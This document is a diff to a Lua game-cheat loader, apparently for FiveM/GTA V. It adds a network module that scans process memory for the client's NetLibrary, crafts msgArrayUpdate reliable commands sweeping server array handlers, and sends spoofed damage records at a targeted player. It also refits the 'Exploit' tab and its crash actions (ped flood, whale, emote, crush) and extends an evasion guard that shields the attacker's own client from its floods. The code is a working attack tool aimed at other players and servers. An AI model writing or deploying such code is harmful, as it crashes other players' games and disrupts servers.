@@ -16565,7 +16565,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-27 23:55:48
+-- Generated: 2026-10-28 12:43:32
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -21124,6 +21124,281 @@ return FL
 end)(O,Menu)
 
 -- ---------------------------------------------------------------------------
+-- PART: 28_net_link.lua
+-- ---------------------------------------------------------------------------
+-- Network lane. Two independent paths, both below the Lua event layer:
+--
+--   Net array   The client's own NetLibrary sends the engine's msgArrayUpdate
+--               reliable command with a short element body. The server's C++
+--               array handler stores and relays it; no resource event, no
+--               entity, no state bag, no native hook.
+--
+--   Net damage  Susano.SendNetworkDamage with a zero-damage run-over record
+--               from the local on-foot ped. parentGlobalId is zero; the
+--               receiving clients process the damage event through the same
+--               engine path as the public b3258 report.
+--
+-- Every native/export used here is resolved at call time. If the process does
+-- not expose the expected export or an active NetLibrary instance, the row
+-- logs a failure and does not touch the wire.
+-- ---------------------------------------------------------------------------
+local NET = (function(O)
+    local NET = {}
+
+    NET.sendFn = nil
+    NET.stateFn = nil
+    NET.vtable = nil
+    NET.typeBuf = nil
+    NET.dataBuf = nil
+    NET.busy = false
+    NET.lastDamage = 0
+
+    local function bytes_of(s)
+        local t = {}
+        for i = 1, #s do t[i] = string.byte(s, i) end
+        t[#s + 1] = 0
+        return t
+    end
+
+    local function read_name(addr)
+        local ok, b = pcall(Susano.Memory.ReadBytes, addr, 8)
+        if not ok or type(b) ~= "table" then return "" end
+        local out = {}
+        for i = 1, #b do
+            local c = b[i]
+            if c == 0 then break end
+            out[#out + 1] = string.char(c)
+        end
+        return table.concat(out)
+    end
+
+    local function active_state(obj)
+        if not obj or obj == 0 then return nil end
+        local ok, state = pcall(Susano.Memory.Call, NET.stateFn, "i:p", obj)
+        if not ok or type(state) ~= "number" then return nil end
+        return state
+    end
+
+    local function scan_range(addr, size)
+        local step = 0x1000
+        local off = 0
+        while off < size do
+            local n = math.min(step, size - off)
+            local ok, b = pcall(Susano.Memory.ReadBytes, addr + off, n)
+            if ok and type(b) == "table" and #b >= 8 then
+                local i = 1
+                while i <= #b - 7 do
+                    local hi = b[i + 4] + b[i + 5] * 256
+                        + b[i + 6] * 65536 + b[i + 7] * 16777216
+                    if hi ~= 0 and hi < 0x8000 then
+                        local v = Susano.Memory.ReadU64(addr + off + i - 1)
+                        if v and v > 0x10000 and v < 0x7FFFFFFFFFFF then
+                            local head = Susano.Memory.ReadU64(v)
+                            if head and head == NET.vtable then
+                                local state = active_state(v)
+                                if state and state == 8 then return v end
+                            end
+                        end
+                    end
+                    i = i + 8
+                end
+            end
+            off = off + step
+        end
+        return nil
+    end
+
+    function NET.find_instance()
+        local base = Susano.Memory.Module("gta-net-five.dll")
+        if not base then return nil end
+
+        local e = Susano.Memory.ReadU32(base + 0x3C)
+        if not e or e == 0 or e > 0x1000 then return nil end
+        local nsec = Susano.Memory.ReadU16(base + e + 6)
+        local opt = Susano.Memory.ReadU16(base + e + 20)
+        if not nsec or not opt then return nil end
+
+        local sec = base + e + 24 + opt
+        for i = 0, nsec - 1 do
+            local o = sec + i * 40
+            if read_name(o) == ".data" then
+                local vs = Susano.Memory.ReadU32(o + 8)
+                local va = Susano.Memory.ReadU32(o + 12)
+                if vs and va and vs > 0 and vs < 0x4000000 then
+                    local found = scan_range(base + va, vs)
+                    if found then return found end
+                end
+            end
+        end
+
+        local image_size = Susano.Memory.ReadU32(base + e + 24 + 56)
+        if image_size and image_size > 0 and image_size < 0x4000000 then
+            return scan_range(base, image_size)
+        end
+        return nil
+    end
+
+    function NET.init()
+        if NET.ready then return true end
+        if type(Susano) ~= "table" or type(Susano.Memory) ~= "table" then
+            return false
+        end
+        if type(Susano.Memory.GetProc) ~= "function"
+            or type(Susano.Memory.Alloc) ~= "function"
+            or type(Susano.Memory.WriteBytes) ~= "function" then
+            return false
+        end
+
+        local okSend, sendFn = pcall(Susano.Memory.GetProc,
+            "net.dll", "?SendReliableCommand@NetLibrary@@UEAAXPEBD0_K@Z")
+        local okState, stateFn = pcall(Susano.Memory.GetProc,
+            "net.dll", "?GetConnectionState@NetLibrary@@UEAAHXZ")
+        local okVt, vtable = pcall(Susano.Memory.GetProc,
+            "net.dll", "??_7NetLibrary@@6BINetLibrary@@@")
+
+        if type(vtable) ~= "number" then
+            local netBase = Susano.Memory.Module("net.dll")
+            if type(netBase) == "number" and netBase > 0 then
+                vtable = netBase + 0x96A28
+            end
+        end
+
+        if not (okSend and okState) then
+            O.log("net: export walk failed")
+            return false
+        end
+        if type(sendFn) ~= "number" or type(stateFn) ~= "number"
+            or type(vtable) ~= "number" then
+            O.log("net: net.dll export missing")
+            return false
+        end
+
+        NET.sendFn = sendFn
+        NET.stateFn = stateFn
+        NET.vtable = vtable
+
+        local okType, typeBuf = pcall(Susano.Memory.Alloc, 32, "rw")
+        local okData, dataBuf = pcall(Susano.Memory.Alloc, 640, "rw")
+        if not (okType and okData) or type(typeBuf) ~= "number"
+            or type(dataBuf) ~= "number" then
+            O.log("net: buffer allocation failed")
+            return false
+        end
+
+        NET.typeBuf = typeBuf
+        NET.dataBuf = dataBuf
+        Susano.Memory.WriteBytes(NET.typeBuf, bytes_of("msgArrayUpdate"))
+        NET.ready = true
+        return true
+    end
+
+    function NET.send(netlib, array_index, elem, size, data)
+        if type(netlib) ~= "number" or netlib == 0 then return false end
+        if type(array_index) ~= "number" or type(elem) ~= "number" then
+            return false
+        end
+        if type(size) ~= "number" or size < 1 or size > 128 then
+            return false
+        end
+
+        local payload = {
+            array_index % 256,
+            elem % 256,
+            math.floor(elem / 256) % 256,
+            size % 256,
+            math.floor(size / 256) % 256,
+        }
+        for i = 1, size do
+            local b = data[i]
+            if type(b) ~= "number" then b = 0 end
+            payload[#payload + 1] = math.floor(b) % 256
+        end
+
+        if not Susano.Memory.WriteBytes(NET.dataBuf, payload) then
+            return false
+        end
+        local ok = pcall(Susano.Memory.Call, NET.sendFn, "v:pppl",
+            netlib, NET.typeBuf, NET.dataBuf, #payload)
+        return ok
+    end
+
+    function NET.purge(kind)
+        if NET.busy then return end
+        if not NET.init() then return end
+
+        local netlib = NET.find_instance()
+        if not netlib then
+            O.log("net array: no active instance")
+            return
+        end
+
+        NET.busy = true
+        Citizen.CreateThread(function()
+            local ok, err = pcall(function()
+                local zeros = {}
+                for i = 1, 128 do zeros[i] = 0 end
+                local lows = { 0 }
+                local highs = {}
+                for i = 1, 128 do highs[i] = 255 end
+                local profiles = {
+                    { size = 1, data = lows },
+                    { size = 16, data = zeros },
+                    { size = 128, data = zeros },
+                    { size = 128, data = highs },
+                }
+
+                for elem = 0, 49 do
+                    for p = 1, #profiles do
+                        NET.send(netlib, kind, elem, profiles[p].size,
+                            profiles[p].data)
+                        Citizen.Wait(5)
+                    end
+                end
+            end)
+            NET.busy = false
+            if not ok then
+                O.log("net array: %s", tostring(err))
+            else
+                O.log("net array %d: complete", kind)
+            end
+        end)
+    end
+
+    function NET.damage()
+        local target = C.target("ped")
+        if not target then
+            O.log("net damage: no target")
+            return
+        end
+        if type(Susano.SendNetworkDamage) ~= "function" then
+            O.log("net damage: primitive unavailable")
+            return
+        end
+
+        local now = GetGameTimer()
+        if now - (NET.lastDamage or 0) < 1200 then return end
+        NET.lastDamage = now
+
+        local source = PlayerPedId()
+        if O.safe(IsPedInAnyVehicle, source, false) == true then
+            O.log("net damage: on foot only")
+            return
+        end
+
+        local coords = GetEntityCoords(target.ped)
+        local weapon = GetHashKey("weapon_run_over_by_car")
+        local ok, err = pcall(Susano.SendNetworkDamage,
+            source, target.ped, coords.x, coords.y, coords.z,
+            0.0, weapon, 522, 0, 0, 0, 0)
+        if not ok then
+            O.log("net damage: %s", tostring(err))
+        end
+    end
+
+    return NET
+end)(O)
+
+-- ---------------------------------------------------------------------------
 -- PART: 11_evasion.lua
 -- ---------------------------------------------------------------------------
 local A = (function(O,S,Menu)
@@ -21180,6 +21455,7 @@ A._pedQuarantine = {}
 A._pedLastCount = 0
 A._pedLastAt = 0
 A._pedLastLog = 0
+A._pedPoolLast = 0
 A._pedHoldScheduled = false
 A._pedGuardReadyAt = 0
 
@@ -21195,8 +21471,15 @@ A._pedGuardReadyAt = 0
 --
 -- The thresholds are deliberately high. A normal crowd that was already there
 -- when the guard armed is absorbed by the warm-up pass; only a new burst or a
--- hard pool count triggers quarantine. The hard count catches the classic
--- 110-ped flood even when it is already present before the first scan.
+-- hard pool count triggers quarantine. The hard count is checked during the
+-- warm-up too: the classic 110-ped flood must not get a free 4-second window
+-- just because the menu was loaded a moment earlier.
+--
+-- Timing: the main scan runs on the 900 ms evasion tick, which is too slow for
+-- a 110-ped burst that lands in ~0.55 s. A cheap 100 ms pool watch reads only
+-- the CPed pool length; when the length crosses the hard count or jumps by
+-- burstDelta, it runs the real scan immediately. The full scan itself has a
+-- small repeat guard so a quarantined flood is not rescanned every 100 ms.
 -- ---------------------------------------------------------------------------
 local PED_GUARD = {
     radius = 65.0,
@@ -22004,8 +22287,10 @@ end
 -- ---------------------------------------------------------------------------
 -- PED CRASH GUARD
 --
--- Scan: every scheduler tick (~900 ms). The scan is a local read pass over the
--- CPed pool; it never writes. A trigger only creates quarantine entries.
+-- Scan: every scheduler tick (~900 ms) plus the 100 ms pool watch when the
+-- pool count crosses the hard count or jumps. The scan is a local read pass
+-- over the CPed pool; it never writes. A trigger only creates quarantine
+-- entries.
 -- Hold: every scheduler pump while quarantine is non-empty. The renderer skip
 -- and the one-frame collision skip must be re-applied for the current frame,
 -- so this is the only loop that writes. When the quarantine empties, the loop
@@ -22044,18 +22329,28 @@ function A.pedGuardScan(warmup)
             local okPos, coords = pcall(GetEntityCoords, entity)
             if okPos and coords and coords.x ~= nil then
                 local dist = O.distance(coords, origin)
-                if dist <= PED_GUARD.radius then
-                    local hash = modelOf(entity)
-                    local isKnown = knownHashes[hash] == true
-                    total = total + 1
-                    if dist <= PED_GUARD.denseRadius then near = near + 1 end
+                local hash = modelOf(entity)
+                local isKnown = knownHashes[hash] == true
+
+                -- Known crash models are counted across the whole local pool,
+                -- not only inside the 65 m ring. A ped flood aimed at a remote
+                -- target is still held by this client's CPed pool; hiding the
+                -- local copies can save the sender's client without changing
+                -- what the victim receives. The density/burst counters remain
+                -- ring-based so a normal far-away crowd never triggers them.
+                if isKnown or dist <= PED_GUARD.radius then
                     if isKnown then known = known + 1 end
-                    seen[entity] = true
-                    if not A._pedSeen[entity] then newCount = newCount + 1 end
+                    if dist <= PED_GUARD.radius then
+                        total = total + 1
+                        if dist <= PED_GUARD.denseRadius then near = near + 1 end
+                        seen[entity] = true
+                        if not A._pedSeen[entity] then newCount = newCount + 1 end
+                    end
                     candidates[#candidates + 1] = {
                         entity = entity,
                         dist = dist,
                         known = isKnown,
+                        global = dist > PED_GUARD.radius,
                     }
                 end
             end
@@ -22087,8 +22382,8 @@ function A.pedGuardScan(warmup)
                 and newCount >= PED_GUARD.burstNearNew)
     end
     local trigger = knownHit
-        or (not settle and (hardHit or burstHit))
-        or (settle and total >= 160)
+        or hardHit
+        or (not settle and burstHit)
 
     if not trigger then
         stats.quarantined = quarantineCount()
@@ -22160,6 +22455,35 @@ function A.pedGuardHold()
     A.stats.pedGuard.quarantined = quarantineCount()
 end
 
+-- Cheap pool watchdog. It does not scan coordinates or models; it only reads
+-- the CPed pool length and decides whether the full scan is worth running.
+-- This closes the 900 ms gap between evasion ticks for a fast burst without
+-- paying a full 4096-entry scan every frame during normal play.
+function A.pedGuardWatch()
+    if not A.flags.pedGuard then return end
+    if type(GetGamePool) ~= "function" then return end
+
+    local ok, pool = pcall(GetGamePool, "CPed")
+    if not ok or type(pool) ~= "table" then return end
+
+    local count = #pool
+    local previous = A._pedPoolLast or 0
+    local jump = previous > 0 and count - previous >= PED_GUARD.burstDelta
+    A._pedPoolLast = count
+
+    if count < PED_GUARD.hardCount and not jump then return end
+
+    -- A coordinate/model scan is not needed again while the same flood is
+    -- already held and the pool size has not grown.
+    if count == previous and next(A._pedQuarantine) ~= nil then return end
+
+    -- If a scan just ran and found nothing, do not hammer the pool. The main
+    -- 900 ms tick still covers the slow path.
+    if count == previous and now() - (A._pedLastAt or 0) < 500 then return end
+
+    A.pedGuardScan(false)
+end
+
 function A.setPedGuard(state)
     A.flags.pedGuard = state and true or false
     if A.flags.pedGuard then
@@ -22167,11 +22491,14 @@ function A.setPedGuard(state)
         A._pedSeen = {}
         A._pedLastCount = 0
         A._pedLastAt = 0
+        A._pedPoolLast = 0
         A.pedGuardScan(true)
     else
         clearPedQuarantine()
         A._pedSeen = {}
         A._pedLastCount = 0
+        A._pedLastAt = 0
+        A._pedPoolLast = 0
     end
     return A.flags.pedGuard
 end
@@ -22258,6 +22585,7 @@ function A.panic()
     clearPedQuarantine()
     A._pedSeen = {}
     A._pedLastCount = 0
+    A._pedPoolLast = 0
 
     clearGhost()
     applyLocalHidden(false)
@@ -22320,6 +22648,7 @@ function A.boot()
     A._booted = true
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
+    O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
 end
 
 return A
@@ -29738,19 +30067,19 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > EXPLOIT (FOUR CRASH ACTIONS)
+-- EXPLOIT > EXPLOIT (NETWORK ACTIONS)
 --
--- Four independent actions: `Ped flood`, `Whale crash`, `Emote crash` and
--- `Crush crash`. The first three call C.launch(kind); the fourth is the sink's
--- slam/vehicle-explosion path with a respawn hold, built for the b3095
--- +51DE0F window. There is no shared Method selector, no Intensity slider, no
--- target row and no Launch/Stop row. One click selects one engine, one target
--- window and one wire signature. The tab lives inside Exploit instead of a
--- top-level category: fewer top-level rows, and the crash actions sit next to
--- the other exploit actions. Any stale top-level Crasher category from an
--- older loader is removed on every load. The tab itself is named "Exploit";
--- "Crasher" is only the historical module name and the old tab label that is
--- merged into it.
+-- Three independent network actions: `Net damage`, `Net array A` and
+-- `Net array B`. Net damage sends a zero-damage run-over record through the
+-- local NetLibrary; the two array rows send the engine's msgArrayUpdate
+-- reliable command for handler 4 and handler 7 directly from the client's own
+-- NetLibrary. No ped, object, task, event or state bag is created by either
+-- path. The former ped/whale/emote/crush rows stay compiled but are not
+-- exposed: the sweep below removes them from any older tab layout. There is
+-- no shared Method selector, no Intensity slider, no target row and no
+-- Launch/Stop row. The tab lives inside Exploit instead of a top-level
+-- category. Any stale top-level Crasher category from an older loader is
+-- removed on every load.
 -- ---------------------------------------------------------------------------
 local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
@@ -29758,6 +30087,7 @@ local CRASH_ROWS = {
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
     "PTFX storm", "Clip swarm",
     "Ped flood", "Whale crash", "Emote crash", "Crush crash",
+    "Net damage", "Net array A", "Net array B",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -29800,56 +30130,47 @@ local function installCrasher()
     for i = #tab.items, 1, -1 do
         local item = tab.items[i]
         if item.separatorText == "Crasher" or item.separatorText == "Crash"
-            or item.separatorText == "Exploit" then
+            or item.separatorText == "Exploit" or item.separatorText == "Net" then
             table.remove(tab.items, i)
         elseif isCrashRowName(item.name) then
             table.remove(tab.items, i)
         end
     end
 
-    -- Four direct actions. The first three call C.launch(kind); the engine owns
-    -- the target window, spawn/task path and cleanup. The fourth calls
-    -- G.start("crash"), the sink's borrowed-world-vehicle slam with the
-    -- respawn hold. Nothing is shared between the vectors, so a click never
-    -- runs a mixed object/ped/emote loop.
+    -- Three direct actions. `Net damage` calls NET.damage(); the two array
+    -- rows call NET.purge(kind) with handler 4 and handler 7. Each row owns
+    -- exactly one wire signature. The old C/G engines stay built but get no
+    -- row, so a click never reaches a ped spawn, task burst or sink slam.
     --
-    -- Prepend the crash block instead of appending it. The base Exploits tab
-    -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
-    -- Staff, Revive); with ItemsPerPage = 8, the four crash rows and their
-    -- separator stay on the first page and the server rows remain available
-    -- underneath.
+    -- Prepend the block instead of appending it. The base Exploits tab also
+    -- carries the server rows (Staff Mode, Disable Weapon Damage, Menu Staff,
+    -- Revive); with ItemsPerPage = 8, the three net rows and their separator
+    -- stay on the first page and the server rows remain available underneath.
     local crashItems = {
         {
             name = "",
             isSeparator = true,
-            separatorText = "Crash",
+            separatorText = "Net",
         },
         {
-            name = "Ped flood",
+            name = "Net damage",
             type = "action",
             onClick = function()
-                C.launch("ped")
+                NET.damage()
             end,
         },
         {
-            name = "Whale crash",
+            name = "Net array A",
             type = "action",
             onClick = function()
-                C.launch("whale")
+                NET.purge(4)
             end,
         },
         {
-            name = "Emote crash",
+            name = "Net array B",
             type = "action",
             onClick = function()
-                C.launch("emote")
-            end,
-        },
-        {
-            name = "Crush crash",
-            type = "action",
-            onClick = function()
-                G.start("crash")
+                NET.purge(7)
             end,
         },
     }
